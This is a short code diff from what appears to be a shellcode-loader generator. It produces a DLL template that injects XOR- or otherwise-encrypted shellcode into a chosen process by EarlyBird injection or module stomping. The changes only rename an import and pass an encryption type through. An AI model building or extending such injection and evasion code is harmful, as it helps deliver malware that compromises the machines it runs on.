@@ -1,6 +1,6 @@
 from Injection.EarlyBird_Injection import EarlyBird
 from Injection.Module_Stomping import ModuleStomping
-from Encryption.chosen_encryption import ChosenEncryption
+from Encryption.Choose_Encryption import ChosenEncryption
 
 # here we specify the DLL skeleton 
 def template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_hex,process_to_inject,time,injection,encryption_type):
@@ -91,7 +91,7 @@ def template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_h
     DWORD WINAPI DoMagic(LPVOID lpParameter)
     {{
         {
-            EarlyBird(shellcode_var, ciphertext_split, process_to_inject, time, xor_func, key_var, key_hex)
+            EarlyBird(shellcode_var, ciphertext_split, process_to_inject, time, xor_func, key_var, key_hex,encryption_type)
             if injection == "EB" else ModuleStomping() if injection == "MS" else ""
         }
 
